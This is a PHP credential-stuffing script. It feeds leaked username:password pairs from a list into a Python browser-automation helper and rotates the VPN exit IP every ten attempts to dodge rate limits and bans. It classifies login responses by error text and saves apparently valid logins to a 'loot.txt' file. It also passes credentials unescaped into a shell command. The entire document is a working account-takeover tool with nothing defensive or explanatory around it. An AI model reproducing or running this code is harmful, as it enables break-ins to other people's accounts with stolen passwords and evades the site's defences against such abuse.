<?php
  
  function pia_getStatus() {
    
    $shell_exec = shell_exec('piactl get connectionstate');
    
    return trim($shell_exec);
    
  }
  
  function pia_newIP() {
    
    $status = pia_getStatus();
    
    if ($status !== 'Disconnected') {
      
      shell_exec('piactl disconnect');
      
      sleep(1);
      
    }
    
    $status = pia_getStatus();
    
      shell_exec('piactl connect');
      
      while ($status !== 'Connected') {
              
        var_dump($status);
              
        sleep(1);
        
        $status = pia_getStatus();
              
      }
    
  }
    
  ini_set('memory_limit','4000M');
  
  $dump = array_filter(file(__DIR__ . "/../credential-list.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
  
  shuffle($dump);
  
  $bans = 0;
  
  $attempts = 0;
  
  pia_newIP();
  
  foreach($dump as &$dump) {
    
    if ($attempts >= 10) {
      
      pia_newIP();
      
      $attempts = 0;
      
    }
    
    $attempts++;
    
    $line = explode(":", $dump, 2);
    
    if (count($line) > 1) {
      
      $user = $line[0];
      $pass = $line[1];
      
      $creds = $user . ':' . $pass;
      
      echo $creds . " - ";
      
      $profile = 'profile';
      
      $profile_dir = __DIR__ . '/' . $profile;
      
      $default_dir = $profile_dir . '/Default';
      
      $cookie_file = $default_dir . '/Cookies';
      
      if (file_exists($cookie_file)) unlink($cookie_file);
            
      $html = shell_exec('python3 navigate.py "' . $user . '" "' . $pass . '" ' . $profile);
      
      if (preg_match('/Incorrect password/', $html)) {
        
        echo 'incorrect';
        
        $bans = 0;
        
      } else if (preg_match("/we can't find an account with this email address/", $html)) {
        
        echo 'no account';
        
        $bans = 0;
        
      } else if (null === $html or preg_match('/Something went wrong/', $html)) {
        
        echo 'banned';
        
        $bans++;
        
        if ($bans >= 3) die(PHP_EOL);
        
      } else {
                
        echo 'accepted?';
        
        $bans = 0;
        
        file_put_contents(__DIR__ . '/loot.txt', $creds . PHP_EOL, FILE_APPEND);
                
      }
      
      echo PHP_EOL;
      
    }
    
    $dump = null;
    
  }
      
  die(PHP_EOL);